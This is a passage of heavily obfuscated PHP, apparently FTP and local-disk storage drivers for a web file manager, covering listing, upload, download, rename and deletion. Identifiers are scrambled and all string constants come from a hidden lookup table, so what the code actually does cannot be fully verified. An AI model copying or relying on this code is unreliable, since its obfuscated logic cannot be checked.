@ftp_delete($this->connect, $ÏÎì©¾‚); } public function delFolder($¦ó§©) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ç°°½» = $Óè‡¦Ó = array(); $this->fileList($¦ó§©, $ç°°½», $Óè‡¦Ó, !0); $this->listItemCache = !0; foreach ($Óè‡¦Ó as $ê†Şø¹) { $ßÄõÚª = $this->iconvSystem($ê†Şø¹[$_SERVER[Á÷ ­Šë][28]]); $ë“ŞáÛ² = @ftp_delete($this->connect, $ßÄõÚª); if (!$ë“ŞáÛ²) { return !1; } } foreach ($ç°°½» as $ßÄõÚª) { $ßÄõÚª = $this->iconvSystem($ßÄõÚª); $ë“ŞáÛ² = @ftp_rmdir($this->connect, $ßÄõÚª); if (!$ë“ŞáÛ²) { return !1; } } $¦ó§© = $this->iconvSystem($¦ó§©); return @ftp_rmdir($this->connect, $¦ó§©); } public function rename($ìÅ±î…, $šÕ™õ„) { $¬°ƒ­Î =& $_SERVER[Á÷ ­Šë]; if (!$this->_isconn()) { return !1; } $ÀÈÃ«É´ = $this->fileNameAuto($this->pathFather($ìÅ±î…), $šÕ™õ„); $ÀÈÃ«É´ = $this->iconvSystem($ÀÈÃ«É´); $ìÅ±î… = $this->iconvSystem($ìÅ±î…); $…šõè‘Ø = $this->pathFather($ìÅ±î…); $êı¬¤Ô = rtrim($…šõè‘Ø, $¬°ƒ­Î[8]) . $¬°ƒ­Î[8] . $ÀÈÃ«É´; $çìâÖ± = @ftp_rename($this->connect, $ìÅ±î…, $êı¬¤Ô); $êı¬¤Ô = $this->iconvApp($êı¬¤Ô); return $çìâÖ± ? $this->getPathOuter($êı¬¤Ô) : !1; } private function folderInfo($Üáï£´Ò, $ø‹šï…Û = false) { $´ŸıÊ²ñ =& $_SERVER[Á÷ ­Šë]; $üıÓÌ°Ú = array($´ŸıÊ²ñ[28] => $this->pathThis($Üáï£´Ò), $´ŸıÊ²ñ[86] => $this->getPathOuter($´ŸıÊ²ñ[8] . $Üáï£´Ò), $´ŸıÊ²ñ[29] => $´ŸıÊ²ñ[87]); if ($ø‹šï…Û) { return $üıÓÌ°Ú; } $üıÓÌ°Ú[$´ŸıÊ²ñ[204]] = $üıÓÌ°Ú[$´ŸıÊ²ñ[94]] = 0; $üıÓÌ°Ú[$´ŸıÊ²ñ[205]] = $üıÓÌ°Ú[$´ŸıÊ²ñ[206]] = !0; return $üıÓÌ°Ú; } private function fileInfo($«ß½ı™, $ìÙ¶Èí = false, $ê°Ôæí = array()) { $´ïÒàÒ =& $_SERVER[Á÷ ­Šë]; $êç«áğ½ = array($´ïÒàÒ[28] => $this->pathThis($«ß½ı™), $´ïÒàÒ[86] => $this->getPathOuter($´ïÒàÒ[8] . $«ß½ı™), $´ïÒàÒ[29] => $´ïÒàÒ[203], $´ïÒàÒ[88] => isset($ê°Ôæí[$´ïÒàÒ[88]]) ? $ê°Ôæí[$´ïÒàÒ[88]] : 0, $´ïÒàÒ[178] => $this->ext($«ß½ı™)); if ($ìÙ¶Èí) { return $êç«áğ½; } $êç«áğ½[$´ïÒàÒ[204]] = $êç«áğ½[$´ïÒàÒ[94]] = 0; $êç«áğ½[$´ïÒàÒ[205]] = $êç«áğ½[$´ïÒàÒ[206]] = !0; $•¢±îìÉ = $this->iconvSystem($«ß½ı™); $êç«áğ½[$´ïÒàÒ[94]] = @ftp_mdtm($this->connect, $•¢±îìÉ); if (empty($ê°Ôæí)) { $ê°Ôæí = $this->objectMeta($«ß½ı™); if (!$ê°Ôæí) { return $êç«áğ½; } } $êç«áğ½[$´ïÒàÒ[88]] = $ê°Ôæí[$´ïÒàÒ[88]]; return $êç«áğ½; } public function size($Úş¼Ú) { $ ˆçª¼” = $this->objectMeta($Úş¼Ú); return $ ˆçª¼” ? $ ˆçª¼”[$_SERVER[Á÷ ­Šë][88]] : 0; } public function info($ù†Îğ£‹) { if ($this->isFile($ù†Îğ£‹)) { return $this->fileInfo($ù†Îğ£‹, 0); } else { if ($this->isFolder($ù†Îğ£‹)) { return $this->folderInfo($ù†Îğ£‹); } } return !1; } private function fileList($»±ıÜáø, &$±úü£Å×, &$®Ì«Î­, $ğîâ¬¼Ü = false) { $…û®ê·˜ =& $_SERVER[Á÷ ­Šë]; $»±ıÜáø = $this->iconvSystem($»±ıÜáø); if (!$this->isFolder($»±ıÜáø)) { return !1; } @ftp_chdir($this->connect, $…û®ê·˜[8]); $»±ıÜáø = rtrim($»±ıÜáø, $…û®ê·˜[8]) . $…û®ê·˜[8]; check_abort(); $ÑÍ‡¿·— = $this->listItemCache === !1 ? !1 : !0; $Ï¨¿ŞúÁ = @ftp_rawlist($this->connect, $»±ıÜáø); if (!$Ï¨¿ŞúÁ) { $Ï¨¿ŞúÁ = array(); } $Ãä¦ÎÖ« = array($…û®ê·˜[105] => 1, $…û®ê·˜[1296] => 1); foreach ($Ï¨¿ŞúÁ as $äÑÓ ) { $ĞÓæéç¾ = $this->_listItem($äÑÓ ); if ($ĞÓæéç¾[0] == $…û®ê·˜[754]) { continue; } $ˆ‹¢„éó = $ĞÓæéç¾[8]; if (empty($ˆ‹¢„éó) && $ˆ‹¢„éó !== $…û®ê·˜[201] || isset($Ãä¦ÎÖ«[$ˆ‹¢„éó])) { continue; } $ˆ‹¢„éó = $this->iconvApp($»±ıÜáø . ltrim($ˆ‹¢„éó, $…û®ê·˜[8])); $ˆ¾éù×‚ = array($…û®ê·˜[28] => $ˆ‹¢„éó, $…û®ê·˜[29] => $…û®ê·˜[203], $…û®ê·˜[88] => $ĞÓæéç¾[4]); if (substr($äÑÓ , 0, 1) == $…û®ê·˜[1297]) { $ˆ¾éù×‚[$…û®ê·˜[29]] = $…û®ê·˜[87]; $ˆ¾éù×‚[$…û®ê·˜[88]] = 0; } $»¦ü»ú = $ˆ¾éù×‚[$…û®ê·˜[29]] == $…û®ê·˜[87] ? !0 : !1; if ($ÑÍ‡¿·—) { $this->cacheMethod($…û®ê·˜[209], $ˆ‹¢„éó, $»¦ü»ú); $this->cacheMethod($…û®ê·˜[210], $ˆ‹¢„éó, $ˆ¾éù×‚); } if ($»¦ü»ú) { $±úü£Å×[] = $ˆ‹¢„éó; if ($ğîâ¬¼Ü) { $this->fileList($ˆ‹¢„éó, $±úü£Å×, $®Ì«Î­, $ğîâ¬¼Ü); } continue; } $®Ì«Î­[] = $ˆ¾éù×‚; } if ($ÑÍ‡¿·—) { $this->cacheMethod($…û®ê·˜[209], $»±ıÜáø, !0); } } private function _listItem($´ÂÏÜ©å) { if (empty($´ÂÏÜ©å)) { return array(); } $˜Øùû‹¥ = preg_split($_SERVER[Á÷ ­Šë][1298], $´ÂÏÜ©å); if (count($˜Øùû‹¥) <= 9) { return $˜Øùû‹¥; } $˜Øùû‹¥[8] = trim(substr($´ÂÏÜ©å, strpos($´ÂÏÜ©å, $˜Øùû‹¥[7]) + strlen($˜Øùû‹¥[7]))); return array_splice($˜Øùû‹¥, 0, 9); } public function listPath($Ä‚â½¤’, $êœ¬ãé› = false) { $Ğ×¸‚—’ =& $_SERVER[Á÷ ­Šë]; if (!$this->_isconn()) { return !1; } $—¤°í‚Ï = $¤¶İõŞÉ = array(); $this->fileList($Ä‚â½¤’, $—¤°í‚Ï, $¤¶İõŞÉ); foreach ($—¤°í‚Ï as $âùÖ¬ú– => $ø¸Âª±‹) { $—¤°í‚Ï[$âùÖ¬ú–] = $this->folderInfo($ø¸Âª±‹, $êœ¬ãé›); } foreach ($¤¶İõŞÉ as $âùÖ¬ú– => $ø¸Âª±‹) { $¤¶İõŞÉ[$âùÖ¬ú–] = $this->fileInfo($ø¸Âª±‹[$Ğ×¸‚—’[28]], $êœ¬ãé›, $ø¸Âª±‹); } return array($Ğ×¸‚—’[85] => $—¤°í‚Ï, $Ğ×¸‚—’[84] => $¤¶İõŞÉ); } public function has($ûªÆƒŸğ, $¯¢Ê¬ï = false, $ÈÊˆ¹® = true) { $­š¶Ëí =& $_SERVER[Á÷ ­Šë]; $–Ÿ¤ß¸ò = $ù†èÎ¥ö = array(); $ˆ¬ê®ä« = $¯¢Ê¬ï ? !0 : !1; $this->fileList($ûªÆƒŸğ, $–Ÿ¤ß¸ò, $ù†èÎ¥ö, $ˆ¬ê®ä«); if ($¯¢Ê¬ï) { return array($­š¶Ëí[213] => count($ù†èÎ¥ö), $­š¶Ëí[214] => count($–Ÿ¤ß¸ò)); } if ($ÈÊˆ¹®) { if (count($ù†èÎ¥ö)) { return !0; } } else { if (count($–Ÿ¤ß¸ò)) { return !0; } } return !1; } public function listAll($®Ó°¨†—) { $–¹›—“Æ =& $_SERVER[Á÷ ­Šë]; if (!$this->_isconn()) { return !1; } $°°´£ñ™ = $½²íÃ“ = array(); $this->fileList($®Ó°¨†—, $°°´£ñ™, $½²íÃ“, !0); $´Ğğ´¥ = array(); foreach ($½²íÃ“ as $÷¦”î) { $´Ğğ´¥[$÷¦”î[$–¹›—“Æ[28]]] = $÷¦”î[$–¹›—“Æ[88]]; } foreach ($°°´£ñ™ as $÷¦”î) { if (is_string($÷¦”î)) { $´Ğğ´¥[$÷¦”î] = 0; } } return $this->listAllFiles($®Ó°¨†—, array_keys($´Ğğ´¥), $´Ğğ´¥); } public function getContent($áË ®©ƒ) { if (!$this->_isconn()) { return !1; } $áË ®©ƒ = $this->iconvSystem($áË ®©ƒ); return $this->fileSubstr($áË ®©ƒ); } public function setContent($ñë¬Ğà, $Íªõî« = '') { if (!$this->_isconn()) { return !1; } $Ø‚‰¹… = $this->pathThis($this->iconvSystem($ñë¬Ğà)); $¼ó‰÷˜Ÿ = $this->tempFile($Ø‚‰¹…); file_put_contents($¼ó‰÷˜Ÿ, $Íªõî«); $ØÈÀ—áù = $this->upload($ñë¬Ğà, $this->iconvApp($¼ó‰÷˜Ÿ)); $this->tempFileRemve($¼ó‰÷˜Ÿ); return $ØÈÀ—áù; } public function fileSubstr($ø€³ŠºÒ, $ì×ÍÇƒÊ = 0, $÷¹Ÿø€ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ø€³ŠºÒ, $ì×ÍÇƒÊ, $÷¹Ÿø€); } private function ftpRequest($Üóèßâ†, $³İ¥¶µ³ = 0, $Ÿ…‹€¿å = false) { $Üóèßâ† = $this->iconvSystem($Üóèßâ†); $çŒÔÉÇ = $this->scheme . $this->host . $_SERVER[Á÷ ­Šë][4] . $this->port; $Ö•äÁˆ = curl_init(); curl_setopt($Ö•äÁˆ, CURLOPT_URL, $çŒÔÉÇ . $this->pathEncode($Üóèßâ†)); curl_setopt($Ö•äÁˆ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($Ÿ…‹€¿å) { $´ìÆ§Æî = $³İ¥¶µ³ + $Ÿ…‹€¿å - 1; curl_setopt($Ö•äÁˆ, CURLOPT_RANGE, "{$³İ¥¶µ³}\x2d{$´ìÆ§Æî}"); } curl_setopt($Ö•äÁˆ, CURLOPT_RETURNTRANSFER, 1); $Í©ı›×‚ = curl_exec($Ö•äÁˆ); curl_close($Ö•äÁˆ); return $Í©ı›×‚; } public function upload($¨âô †, $ëéîíòã, $Ö¼ğÊŠù = false, $ŞÉì¼¬˜ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¨âô †))) { return !1; } $¨âô † = $this->iconvSystem($¨âô †); $ëéîíòã = $this->iconvSystem($ëéîíòã); $ŞÎª²Ù± = ftp_nb_put($this->connect, $¨âô †, $ëéîíòã, FTP_BINARY); while ($ŞÎª²Ù± == FTP_MOREDATA) { $ŞÎª²Ù± = ftp_nb_continue($this->connect); } if ($ŞÎª²Ù± != FTP_FINISHED) { return !1; } return $this->getPathOuter($¨âô †); } public function download($âüœ¢ö, $Ä¶Óæ›Ü = '') { if (!$this->_isconn()) { return !1; } $¿ïç›àæ = $this->pathFather($Ä¶Óæ›Ü); if (!IO::mkdir($¿ïç›àæ)) { return !1; } $âüœ¢ö = $this->iconvSystem($âüœ¢ö); $Ä¶Óæ›Ü = $this->iconvSystem($Ä¶Óæ›Ü); $½öÑ¯« = ftp_nb_get($this->connect, $Ä¶Óæ›Ü, $âüœ¢ö, FTP_BINARY); while ($½öÑ¯« == FTP_MOREDATA) { $½öÑ¯« = ftp_nb_continue($this->connect); } if ($½öÑ¯« != FTP_FINISHED) { return !1; } return $this->iconvApp($Ä¶Óæ›Ü); } public function exist($ ô¤îò) { return $this->isFile($ ô¤îò) || $this->isFolder($ ô¤îò); } public function isFile($ÈÅ¢Ò) { return !$this->isFolder($ÈÅ¢Ò) && $this->objectMeta($ÈÅ¢Ò); } public function isFolder($ìëËš) { return $this->cacheMethod($_SERVER[Á÷ ­Šë][209], $ìëËš); } protected function objectMeta($µÉÇ­å…) { return $this->cacheMethod($_SERVER[Á÷ ­Šë][210], $µÉÇ­å…); } protected function _objectMeta($ÉÚÀ·š) { $è“ÖÈ =& $_SERVER[Á÷ ­Šë]; if ($ÉÚÀ·š == $è“ÖÈ[33] || $ÉÚÀ·š == $è“ÖÈ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ÉÚÀ·š = $this->iconvSystem($ÉÚÀ·š); $Ë§’©ßß = array($è“ÖÈ[28] => $this->iconvApp($ÉÚÀ·š), $è“ÖÈ[29] => $è“ÖÈ[203], $è“ÖÈ[88] => 0); @ftp_chdir($this->connect, $è“ÖÈ[8]); $¤›ÒùöÁ = @ftp_size($this->connect, $ÉÚÀ·š); if ($¤›ÒùöÁ != -1) { $Ë§’©ßß[$è“ÖÈ[88]] = $¤›ÒùöÁ; } else { $é§ÉıÎ = @ftp_chdir($this->connect, $ÉÚÀ·š); if (!$é§ÉıÎ) { return !1; } $Ë§’©ßß[$è“ÖÈ[29]] = $è“ÖÈ[87]; } return $Ë§’©ßß; } protected function _isFolder($›ø‘È) { $®æô²Â =& $_SERVER[Á÷ ­Šë]; if ($›ø‘È == $®æô²Â[33] || $›ø‘È == $®æô²Â[8]) { return !0; } $Ú»’ÆÊÅ = $this->_objectMeta($›ø‘È); return isset($Ú»’ÆÊÅ[$®æô²Â[29]]) && $Ú»’ÆÊÅ[$®æô²Â[29]] == $®æô²Â[87] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ÍûË“¯ñ) { if (substr($ÍûË“¯ñ, 0, 2) == $_SERVER[Á÷ ­Šë][1289]) { $ÍûË“¯ñ = BASIC_PATH . substr($ÍûË“¯ñ, 2); } return $ÍûË“¯ñ; } public function iconvApp($õÖç¸æ) { $âóĞÇ°Ú =& $_SERVER[Á÷ ­Šë]; global $config; return $this->iconvTo($õÖç¸æ, $config[$âóĞÇ°Ú[1287]], $config[$âóĞÇ°Ú[1286]]); } public function iconvSystem($òÃùÏÃË) { $ÈÌ™ôÃ¦ =& $_SERVER[Á÷ ­Šë]; global $config; return $this->iconvTo($òÃùÏÃË, $config[$ÈÌ™ôÃ¦[1286]], $config[$ÈÌ™ôÃ¦[1287]]); } public function getPathOuter($Á‰ºâÎ¢) { $¸Æé¤£ü =& $_SERVER[Á÷ ­Šë]; $ÄÉÑ—Û¢ = $this->iconvApp($this->pathBase); $Á‰ºâÎ¢ = $this->iconvApp($Á‰ºâÎ¢); if (substr($ÄÉÑ—Û¢, 0, 2) == $¸Æé¤£ü[1289]) { $ÄÉÑ—Û¢ = BASIC_PATH . substr($ÄÉÑ—Û¢, 2); } if (substr($Á‰ºâÎ¢, 0, 2) == $¸Æé¤£ü[1289]) { $Á‰ºâÎ¢ = BASIC_PATH . substr($Á‰ºâÎ¢, 2); } $ÄÉÑ—Û¢ = KodIO::clear($ÄÉÑ—Û¢); $Á‰ºâÎ¢ = KodIO::clear($Á‰ºâÎ¢); $Á‰ºâÎ¢ = substr($Á‰ºâÎ¢, strlen($ÄÉÑ—Û¢)); if (empty($this->pathDriver)) { return $Á‰ºâÎ¢; } return $this->pathDriver . $¸Æé¤£ü[8] . ltrim($Á‰ºâÎ¢, $¸Æé¤£ü[8]); } public function mkfile($ñœ¡«, $Ğ”ÅÓºŞ = '', $ÔášÈä = REPEAT_RENAME) { $ñœ¡« = $this->iconvSystem($ñœ¡«); @touch($ñœ¡«); if ($Ğ”ÅÓºŞ) { file_put_contents($ñœ¡«, $Ğ”ÅÓºŞ); } @chmod($ñœ¡«, $this->pathAuth); return is_file($ñœ¡«) ? $this->getPathOuter($ñœ¡«) : !1; } public function mkdir($°èšüÓŒ, $¸ú¥ïÈÔ = REPEAT_SKIP) { $°èšüÓŒ = $this->iconvSystem($°èšüÓŒ); if (is_dir($°èšüÓŒ)) { return $this->getPathOuter($°èšüÓŒ); } @mkdir($°èšüÓŒ, $this->pathAuth, !0); @chmod($°èšüÓŒ, $this->pathAuth); return is_dir($°èšüÓŒ) ? $this->getPathOuter($°èšüÓŒ) : !1; } public function copyFile($Èø™æ¸ë, $—É’»’) { $this->mkdir($this->pathFather($—É’»’)); $Èø™æ¸ë = $this->iconvSystem($Èø™æ¸ë); $—É’»’ = $this->iconvSystem($—É’»’); $ÏĞş¥îç = copy_64($Èø™æ¸ë, $—É’»’); @chmod($—É’»’, $this->pathAuth); return $ÏĞş¥îç ? $this->getPathOuter($—É’»’) : !1; } public function moveFile($Çµ©Øö¢, $­Œ™ö‰¨) { $this->mkdir($this->pathFather($­Œ™ö‰¨)); $Çµ©Øö¢ = $this->iconvSystem($Çµ©Øö¢); $­Œ™ö‰¨ = $this->iconvSystem($­Œ™ö‰¨); $¦ì¦üÓ¨ = intval(@rename($Çµ©Øö¢, $­Œ™ö‰¨)); if (!$¦ì¦üÓ¨) { if ($¦ì¦üÓ¨ = intval(@copy_64($Çµ©Øö¢, $­Œ™ö‰¨))) { @unlink($Çµ©Øö¢); } } @chmod($­Œ™ö‰¨, $this->pathAuth); return $¦ì¦üÓ¨ ? $this->getPathOuter($­Œ™ö‰¨) : !1; } public function movePath($ìêĞ“ò, $’ÆËÊù, $ûŒŒªÃ” = false) { $ÔØ†‡Æé =& $_SERVER[Á÷ ­Šë]; $ìêĞ“ò = $this->iconvSystem($ìêĞ“ò); $’ÆËÊù = $this->iconvSystem($’ÆËÊù); $´ş×ï¨Ñ = rtrim($’ÆËÊù, $ÔØ†‡Æé[8]) . $ÔØ†‡Æé[8] . ($ûŒŒªÃ” ? $ûŒŒªÃ” : get_path_this($ìêĞ“ò)); if (file_exists($´ş×ï¨Ñ)) { return !1; } $çÈÆüÓ­ = intval(@rename($ìêĞ“ò, $´ş×ï¨Ñ)); $çÈÆüÓ­ = file_exists($´ş×ï¨Ñ); return $çÈÆüÓ­ ? $this->getPathOuter($´ş×ï¨Ñ) : !1; } public function delFile($½ÃÄ‡Â´) { $½ÃÄ‡Â´ = $this->iconvSystem($½ÃÄ‡Â´); if (!@unlink($½ÃÄ‡Â´)) { @chmod($½ÃÄ‡Â´, $this->pathAuth); if (!@unlink($½ÃÄ‡Â´)) { return !1; } } else { return !0; } } public function delFolder($”ó©ªÔê) { $å¦ıãş =& $_SERVER[Á÷ ­Šë]; $”ó©ªÔê = $this->iconvSystem($”ó©ªÔê); if (!is_dir($”ó©ªÔê)) { return !0; } if (!($•Ü§—Ê‘ = opendir($”ó©ªÔê))) { return !1; } while (($ªÉ°šÏ = readdir($•Ü§—Ê‘)) !== !1) { if ($ªÉ°šÏ == $å¦ıãş[105] || $ªÉ°šÏ == $å¦ıãş[1296]) { continue; } $ùĞ³ø¿’ = $”ó©ªÔê . $å¦ıãş[8] . $ªÉ°šÏ; if (is_file($ùĞ³ø¿’) || is_link($ùĞ³ø¿’)) { if (!unlink($ùĞ³ø¿’)) { chmod($ùĞ³ø¿’, $this->pathAuth); if (!unlink($ùĞ³ø¿’)) { return !1; } } } else { if (is_dir($ùĞ³ø¿’)) { chmod($ùĞ³ø¿’, $this->pathAuth); $ùĞ³ø¿’ = $this->iconvApp($ùĞ³ø¿’); if (!$this->delFolder($ùĞ³ø¿’)) { return !1; } } } } closedir($•Ü§—Ê‘); return rmdir($”ó©ªÔê); } public function rename($‹µ–ß¦Ù, $ëÒÔôÅ) { $¢çõ¦ƒ‰ =& $_SERVER[Á÷ ­Šë]; $š¢ÎÜ¸× = $this->fileNameAuto($this->pathFather($‹µ–ß¦Ù), $ëÒÔôÅ); $š¢ÎÜ¸× = $this->iconvSystem($š¢ÎÜ¸×); $‹µ–ß¦Ù = $this->iconvSystem($‹µ–ß¦Ù); $ñ­™µ‡Û = $this->pathFather($‹µ–ß¦Ù); $ö¼¬‰üÃ = rtrim($ñ­™µ‡Û, $¢çõ¦ƒ‰[8]) . $¢çõ¦ƒ‰[8] . $š¢ÎÜ¸×; $Á‡ÁÃË³ = @rename($‹µ–ß¦Ù, $ö¼¬‰üÃ); $ö¼¬‰üÃ = $this->iconvApp($ö¼¬‰üÃ); return $Á‡ÁÃË³ ? $this->getPathOuter($ö¼¬‰üÃ) : !1; } public function size($¸¥Æâô“) { $¸¥Æâô“ = $this->iconvSystem($¸¥Æâô“); return filesize_64($¸¥Æâô“); } public function info($‹ûÇŒÃÉ) { $‹ûÇŒÃÉ = $this->iconvSystem($‹ûÇŒÃÉ); if ($this->isFolder($‹ûÇŒÃÉ)) { return $this->folderInfo($‹ûÇŒÃÉ); } else { if ($this->isFile($‹ûÇŒÃÉ)) { return $this->fileInfo($‹ûÇŒÃÉ); } } return !1; } protected function infoChildren($ÔçíˆÅ, &$À¤ë·ƒ½, $‡À²Ù¯Û = true) { $ŞÀ¢ì¼¶ =& $_SERVER[Á÷ ­Šë]; check_abort_echo(); $ÔçíˆÅ = rtrim($ÔçíˆÅ, $ŞÀ¢ì¼¶[8]) . $ŞÀ¢ì¼¶[8]; if ($‡À²Ù¯Û) { $ÔçíˆÅ = $this->iconvSystem($ÔçíˆÅ); } if (!($ğïÈ–ì = @opendir($ÔçíˆÅ))) { return; } while (($‰Æìıõè = readdir($ğïÈ–ì)) !== !1) { if ($‰Æìıõè == $ŞÀ¢ì¼¶[105] || $‰Æìıõè == $ŞÀ¢ì¼¶[1296]) { continue; } $ÈšÈª«Æ = $ÔçíˆÅ . $‰Æìıõè; if (is_file($ÈšÈª«Æ) || is_link($ÈšÈª«Æ)) { $À¤ë·ƒ½[$ŞÀ¢ì¼¶[89]]++; $À¤ë·ƒ½[$ŞÀ¢ì¼¶[88]] += filesize_64($ÈšÈª«Æ); } else { if (is_dir($ÈšÈª«Æ)) { $À¤ë·ƒ½[$ŞÀ¢ì¼¶[90]]++; $this->infoChildren($ÈšÈª«Æ, $À¤ë·ƒ½, !1); } } } closedir($ğïÈ–ì); } private function folderInfo($±ªÁî·, $¿äã®ù = false) { $Á±˜¦ÙÄ =& $_SERVER[Á÷ ­Šë]; $±ªÁî· = rtrim($±ªÁî·, $Á±˜¦ÙÄ[8]) . $Á±˜¦ÙÄ[8]; $«¹ÆŞÉ¾ = $this->iconvApp($this->pathThis($±ªÁî·)); if ($¿äã®ù) { return array($Á±˜¦ÙÄ[28] => $«¹ÆŞÉ¾, $Á±˜¦ÙÄ[86] => $this->getPathOuter($±ªÁî·), $Á±˜¦ÙÄ[29] => $Á±˜¦ÙÄ[87]); } $áûµ¬Î = array($Á±˜¦ÙÄ[28] => $«¹ÆŞÉ¾, $Á±˜¦ÙÄ[86] => $this->getPathOuter($±ªÁî·), $Á±˜¦ÙÄ[29] => $Á±˜¦ÙÄ[87], $Á±˜¦ÙÄ[204] => @filectime($±ªÁî·), $Á±˜¦ÙÄ[94] => @filemtime($±ªÁî·), $Á±˜¦ÙÄ[1299] => @fileatime($±ªÁî·), $Á±˜¦ÙÄ[1300] => is_readable($±ªÁî·), $Á±˜¦ÙÄ[1301] => is_writable($±ªÁî·), $Á±˜¦ÙÄ[1302] => get_mode($±ªÁî·)); return $áûµ¬Î; } private function fileInfo($…‚ŠÕ¥Û, $çÛ×ËÇƒ = false) { $¿õ÷Å´ë =& $_SERVER[Á÷ ­Šë]; $´µƒïü¨ = $this->iconvApp($this->pathThis($…‚ŠÕ¥Û)); if ($çÛ×ËÇƒ) { return array($¿õ÷Å´ë[28] => $´µƒïü¨, $¿õ÷Å´ë[86] => $this->getPathOuter($…‚ŠÕ¥Û), $¿õ÷Å´ë[29] => $¿õ÷Å´ë[203], $¿õ÷Å´ë[88] => $this->size($…‚ŠÕ¥Û), $¿õ÷Å´ë[178] => $this->ext($´µƒïü¨)); } $ßîù•¤± = array($¿õ÷Å´ë[28] => $´µƒïü¨, $¿õ÷Å´ë[86] => $this->getPathOuter($…‚ŠÕ¥Û), $¿õ÷Å´ë[29] => $¿õ÷Å´ë[203], $¿õ÷Å´ë[204] => @filectime($…‚ŠÕ¥Û), $¿õ÷Å´ë[94] => @filemtime($…‚ŠÕ¥Û), $¿õ÷Å´ë[1299] => @fileatime($…‚ŠÕ¥Û), $¿õ÷Å´ë[88] => $this->size($…‚ŠÕ¥Û), $¿õ÷Å´ë[178] => $this->ext($´µƒïü¨), $¿õ÷Å´ë[1300] => is_readable($…‚ŠÕ¥Û), $¿õ÷Å´ë[1301] => is_writable($…‚ŠÕ¥Û), $¿õ÷Å´ë[1302] => get_mode($…‚ŠÕ¥Û)); return $ßîù•¤±; } public function exist($Òåßßå) { $Òåßßå = $this->iconvSystem($Òåßßå); return @file_exists($Òåßßå); } public function isFile($±Ûì…ã) { $±Ûì…ã = $this->iconvSystem($±Ûì…ã); return @is_file($±Ûì…ã); } public function isFolder($Éî¶æ†) { $Éî¶æ† = $this->iconvSystem($Éî¶æ†); return @is_dir($Éî¶æ†); } public function listPath($¯À˜Î¬«, $¨§Å©ŠÓ = false) { $»çÖİÔı =& $_SERVER[Á÷ ­Šë]; $¯À˜Î¬« = $this->iconvSystem($¯À˜Î¬«); $¯À˜Î¬« = rtrim($¯À˜Î¬«, $»çÖİÔı[8]) . $»çÖİÔı[8]; $Ä¥ÁÉŒ« = array($»çÖİÔı[85] => array(), $»çÖİÔı[84] => array()); if (!($æÇà‡ä¥ = @opendir($¯À˜Î¬«))) { return $Ä¥ÁÉŒ«; } while (($é÷üä× = readdir($æÇà‡ä¥)) !== !1) { if ($é÷üä× == $»çÖİÔı[105] || $é÷üä× == $»çÖİÔı[1296]) { continue; } $€×ÂŸ¨ = $¯À˜Î¬« . $é÷üä×; if (is_file($€×ÂŸ¨)) { $Ä¥ÁÉŒ«[$»çÖİÔı[84]][] = $this->fileInfo($€×ÂŸ¨, $¨§Å©ŠÓ); } else { $Ä¥ÁÉŒ«[$»çÖİÔı[85]][] = $this->folderInfo($€×ÂŸ¨, $¨§Å©ŠÓ); } } closedir($æÇà‡ä¥); return $Ä¥ÁÉŒ«; } public function listAll($ú°ÇÉ·ä, &$–Ôğóğ = array()) { $‡¾´¹ô =& $_SERVER[Á÷ ­Šë]; $ú°ÇÉ·ä = $this->iconvSystem($ú°ÇÉ·ä); $ú°ÇÉ·ä = rtrim($ú°ÇÉ·ä, $‡¾´¹ô[8]) . $‡¾´¹ô[8]; if (!($˜æØÍìı = @opendir($ú°ÇÉ·ä))) { return $–Ôğóğ; } while (($›¢ãÓğ² = readdir($˜æØÍìı)) !== !1) { if ($›¢ãÓğ² == $‡¾´¹ô[105] || $›¢ãÓğ² == $‡¾´¹ô[1296]) { continue; } $öìÛŒô• = $ú°ÇÉ·ä . $›¢ãÓğ²; if (is_dir($öìÛŒô•) && !is_link($öìÛŒô•)) { $–Ôğóğ[] = array($‡¾´¹ô[86] => $öìÛŒô• . $‡¾´¹ô[8], $‡¾´¹ô[87] => 1, $‡¾´¹ô[94] => @filemtime($öìÛŒô•), $‡¾´¹ô[88] => 0); $this->listAll($öìÛŒô•, $–Ôğóğ); } else { $–Ôğóğ[] = array($‡¾´¹ô[86] => $öìÛŒô•, $‡¾´¹ô[87] => 0, $‡¾´¹ô[94] => @filemtime($öìÛŒô•), $‡¾´¹ô[88] => $this->size($öìÛŒô•)); } } closedir($˜æØÍìı); return $–Ôğóğ; } public function has($É‘…²ö, $õå•Ç‡Ç = false, $¯çŸ…ç® = true) { $ğÚĞÅÀŸ =& $_SERVER[Á÷ ­Šë]; $É‘…²ö = $this->iconvSystem($É‘…²ö); $É‘…²ö = rtrim($É‘…²ö, $ğÚĞÅÀŸ[8]) . $ğÚĞÅÀŸ[8]; if (!($şŠ‘¬ã = @opendir($É‘…²ö))) { return !1; } $˜¦¾ï« = 0; $ü´—¼´‹ = 0; $´ß–Ùë = 0; while (($ÈõªÏÃå = readdir($şŠ‘¬ã)) !== !1) { if ($ÈõªÏÃå == $ğÚĞÅÀŸ[105] || $ÈõªÏÃå == $ğÚĞÅÀŸ[1296]) { continue; } $óšïøµü = $É‘…²ö . $ÈõªÏÃå; if ($õå•Ç‡Ç) { $´ß–Ùë++; if (@is_file($óšïøµü)) { $˜¦¾ï«++; } else { $ü´—¼´‹++; } if ($´ß–Ùë > 10000) { break; } continue; } if ($¯çŸ…ç®) { if (@is_file($óšïøµü)) { return !0; } } else { if (@is_dir($óšïøµü . $ğÚĞÅÀŸ[8])) { return !0; } } } closedir($şŠ‘¬ã); if ($õå•Ç‡Ç) { return array($ğÚĞÅÀŸ[213] => $˜¦¾ï«, $ğÚĞÅÀŸ[214] => $ü´—¼´‹); } return !1; } public function hashSimple($Ñø¨¥Ó›) { $®‡•¡ =& $_SERVER[Á÷ ­Šë]; if (!$Ñø¨¥Ó›) { return md5($®‡•¡[33]); } $Ñø¨¥Ó› = $this->iconvSystem($Ñø¨¥Ó›); $è•¨¬Òš = $this->size($Ñø¨¥Ó›); $ıÎŸ¼ = 200; $ÍàêêÒæ = 50; if ($è•¨¬Òš <= $ıÎŸ¼ * $ÍàêêÒæ) { return $this->hashMd5($Ñø¨¥Ó›) . $è•¨¬Òš; } $Ë§­§Ø° = 